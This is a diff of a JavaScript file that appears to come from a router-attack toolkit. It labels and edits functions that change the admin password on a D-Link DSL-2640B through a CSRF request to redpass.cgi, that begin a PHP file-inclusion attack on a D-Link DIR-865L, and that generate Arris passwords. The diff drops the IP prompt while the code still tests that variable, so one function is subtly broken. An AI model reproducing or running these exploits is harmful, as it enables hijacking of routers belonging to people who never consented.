@@ -1277,15 +1277,14 @@ function dsltpassr() {
 	}
 }
 
+// D-Link DSL-2640B change admin password CSRF
 function DSL2640B() {
-	ip=prompt("IP:");
 	pass=prompt("Password:");
 	document.dsl2640.action="http://192.168.1.1:80/redpass.cgi?sysPassword="+pass+"&change=1";
 	if (ip==null || ip==""){}else{
 		document.dsl2640.submit();
 	}
 }
-
 function DSL2640Br() {
 	ip=prompt("IP:");
 	pass=prompt("Password:");
@@ -2159,8 +2158,7 @@ function GenArrisPasswords(startdate, enddate) {
   }
 }
 
-
-
+// D-Link DIR 865L PHP file inclusion
 function DIR865L(ip){
 	ip = ip || "192.168.0.1";
 	loca = prompt("Path to XML files containing PHP code for execution\n../../tmp/storage/<sharename>/FILE")
